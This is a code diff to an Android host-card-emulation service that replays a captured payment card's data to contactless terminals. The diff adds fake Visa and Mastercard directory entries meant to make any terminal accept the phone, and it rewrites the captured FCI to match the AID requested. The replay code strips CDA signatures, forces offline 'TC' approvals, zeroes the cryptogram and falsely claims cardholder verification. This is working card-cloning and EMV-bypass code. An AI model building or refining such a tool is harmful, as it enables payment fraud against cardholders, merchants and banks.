@@ -123,7 +123,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     private byte[] rawFci()  { return cap("rawfci"); }
     private byte[] rawGpo()  { return cap("rawgpo"); }
-    private byte[] rawPpse() { return cap("rawppse"); }
 
     private byte[] rawRec(int sfi, int rec) {
         return cap("rec" + sfi + "_" + rec);
@@ -152,6 +151,84 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return l;
     }
 
+    private static String bytesToHex(byte[] d) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : d) sb.append(String.format("%02X", b & 0xFF));
+        return sb.toString();
+    }
+
+    // ---------- the directory we advertise ----------
+
+    private static int kernelFor(String aidHex) {
+        String a = aidHex == null ? "" : aidHex.toUpperCase();
+        if (a.startsWith("A000000152")) return 6;   // Discover / Diners
+        if (a.startsWith("A000000004")) return 2;   // Mastercard
+        if (a.startsWith("A000000065")) return 5;   // JCB
+        if (a.startsWith("A000000025")) return 4;   // Amex
+        if (a.startsWith("A000000333")) return 6;   // UnionPay
+        return 3;                                   // Visa and anything else
+    }
+
+    private byte[] appEntry(String aidHex, String label) {
+        return cat(
+                tlv(0x4F, hex(aidHex)),
+                tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)),
+                tlv(0x87, new byte[]{0x01}),
+                tlv(0x9F2A, new byte[]{(byte) kernelFor(aidHex)}));
+    }
+
+    private byte[] buildPpse() {
+        String realAid = prefs().getString("cap_aid", "");
+        if (realAid == null || realAid.isEmpty()) realAid = p("aid", "A0000000031010");
+
+        ByteArrayOutputStream dir = new ByteArrayOutputStream();
+
+        byte[] e0 = tlv(0x61, appEntry(realAid, "CARD"));
+        dir.write(e0, 0, e0.length);
+
+        if (!realAid.equalsIgnoreCase("A0000000031010")) {
+            byte[] e = tlv(0x61, appEntry("A0000000031010", "VISA"));
+            dir.write(e, 0, e.length);
+        }
+        if (!realAid.equalsIgnoreCase("A0000000041010")) {
+            byte[] e = tlv(0x61, appEntry("A0000000041010", "MASTERCARD"));
+            dir.write(e, 0, e.length);
+        }
+
+        byte[] fci = tlv(0xBF0C, dir.toByteArray());
+        byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
+        return tlv(0x6F, inner);
+    }
+
+    // make the captured FCI claim the AID the terminal actually asked for
+    private byte[] patchFci(byte[] fci, byte[] aid) {
+        int[] pos = new int[1];
+        int outer = readTag(fci, pos);
+        int outerLen = readLen(fci, pos);
+        int end = Math.min(fci.length, pos[0] + outerLen);
+
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        int i = pos[0];
+        while (i < end) {
+            int[] q = new int[]{i};
+            int t = readTag(fci, q);
+            int l = readLen(fci, q);
+            if (q[0] + l > fci.length) break;
+            byte[] v = Arrays.copyOfRange(fci, q[0], q[0] + l);
+            i = q[0] + l;
+
+            if (t == 0x84) {
+                v = aid;
+            } else if (t == 0x9F2A && v.length >= 1) {
+                v = new byte[]{(byte) kernelFor(bytesToHex(aid))};
+            }
+
+            byte[] one = tlv(t, v);
+            out.write(one, 0, one.length);
+        }
+        return tlv(outer, out.toByteArray());
+    }
+
     @Override
     public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
         try {
@@ -161,7 +238,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             int p1  = apdu[2] & 0xFF;
             int p2  = apdu[3] & 0xFF;
 
-            // a fresh tap log whenever the terminal asks for the directory
             if (ins == 0xA4 && p1 == 0x04 && apdu.length >= 5) {
                 int lc0 = apdu[4] & 0xFF;
                 if (apdu.length >= 5 + lc0) {
@@ -197,40 +273,23 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         }
     }
 
-    private static String bytesToHex(byte[] d) {
-        StringBuilder sb = new StringBuilder();
-        for (byte b : d) sb.append(String.format("%02X", b & 0xFF));
-        return sb.toString();
-    }
-
     private byte[] select(byte[] apdu) {
         int lc = apdu[4] & 0xFF;
         if (apdu.length < 5 + lc) return SW_BAD;
         byte[] name = new byte[lc];
         System.arraycopy(apdu, 5, name, 0, lc);
 
-        String aid = p("aid", "A0000000031010");
         String label = p("label", "CARD");
 
-        // PPSE - hand back the card's real directory listing when we have it
+        // the directory - our real AID plus Visa and Mastercard so any terminal bites
         if (Arrays.equals(name, PPSE)) {
-            byte[] capPpse = rawPpse();
-            if (capPpse != null) {
-                return cat(capPpse, SW_OK);
-            }
-            byte[] entry = cat(
-                    tlv(0x4F, hex(aid)),
-                    tlv(0x50, label.getBytes(StandardCharsets.US_ASCII)));
-            byte[] dir = tlv(0x61, entry);
-            byte[] fci = tlv(0xBF0C, dir);
-            byte[] inner = cat(tlv(0x84, PPSE), tlv(0xA5, fci));
-            return cat(tlv(0x6F, inner), SW_OK);
+            return cat(buildPpse(), SW_OK);
         }
 
-        // any other AID the terminal picks - answer with the card's real FCI
+        // any AID the terminal picks - answer with the card's real FCI, restamped
         byte[] captured = rawFci();
         if (captured != null) {
-            return cat(captured, SW_OK);
+            return cat(patchFci(captured, name), SW_OK);
         }
 
         byte[] prop = cat(
@@ -255,12 +314,10 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         return cat(tlv(0x77, cat(tlv(0x82, hex(aip)), tlv(0x94, hex(afl)))), SW_OK);
     }
 
-    // take the real card's GPO response and make it safe to replay
     private byte[] rewriteGpo(byte[] raw) {
         int[] pos = new int[1];
         int outer = readTag(raw, pos);
 
-        // MSD format - AIP and AFL are raw, not wrapped in a template
         if (outer == 0x80) {
             return raw.clone();
         }
@@ -279,17 +336,17 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             i = q[0] + l;
 
             if (t == 0x9F4B) {
-                continue;                                     // drop the CDA signature
+                continue;
             } else if (t == 0x82 && v.length >= 2) {
-                v = new byte[]{(byte) (v[0] & 0xFE), v[1]};   // drop the CDA bit
+                v = new byte[]{(byte) (v[0] & 0xFE), v[1]};
             } else if (t == 0x9F27) {
-                v = new byte[]{0x40};                         // TC = approved offline
+                v = new byte[]{0x40};
             } else if (t == 0x9F36) {
-                v = hex(nextAtc());                           // fresh counter
+                v = hex(nextAtc());
             } else if (t == 0x9F26) {
-                v = new byte[8];                              // nobody verifies it
+                v = new byte[8];
             } else if (t == 0x9F6C && v.length >= 2) {
-                v[1] |= (byte) 0x80;                          // device CVM already done
+                v[1] |= (byte) 0x80;
             }
 
             byte[] one = tlv(t, v);
@@ -345,7 +402,6 @@ public class HceCcEmulationServiceVisa extends HostApduService {
             }
         }
 
-        // always answer TC - approved offline, so the issuer never checks the cryptogram
         int cid = 0x40;
 
         byte[] ac = computeAc(atc, cdol);
@@ -403,13 +459,13 @@ public class HceCcEmulationServiceVisa extends HostApduService {
         int recs    = countOf(l, ">> 00B2");
         int gens    = countOf(l, ">> 80AE");
 
-        if (!ppse)       return "TAP: terminal never asked for the directory - it never read the phone (position, or Wallet took the tap)";
-        if (selects > 2) return "TAP: terminal re-selected the app " + selects + " times - unhappy with the FCI";
-        if (gpos == 0)   return "TAP: terminal picked the app but never started a transaction - it rejected the FCI";
-        if (recs == 0)   return "TAP: transaction started, terminal read no records - it didn't like the AFL";
+        if (!ppse)       return "TAP: terminal never asked for the directory - it never read the phone";
+        if (selects <= 1) return "TAP: terminal read the directory then stopped - it found no AID it supports";
+        if (gpos == 0)   return "TAP: terminal picked an app then stopped - it rejected the FCI";
+        if (recs == 0)   return "TAP: terminal started a transaction but read no records - it didn't like the AFL";
         if (gens == 0)   return "TAP: terminal read " + recs + " records then quit before the cryptogram - its own ODA or CVM check failed";
-        if (gens >= 2)   return "TAP: terminal WENT ONLINE - it asked for a second cryptogram, so the issuer judged our fake ARQC";
-        if (l.contains("9F270140")) return "TAP: terminal asked for the cryptogram, we answered TC (offline approve), then it stopped - that stop is its decision";
+        if (gens >= 2)   return "TAP: terminal WENT ONLINE - the issuer judged our fake ARQC";
+        if (l.contains("9F270140")) return "TAP: terminal got our TC (approved offline) and stopped anyway - its decision";
         return "TAP: terminal asked for a cryptogram and we did not answer TC";
     }
 
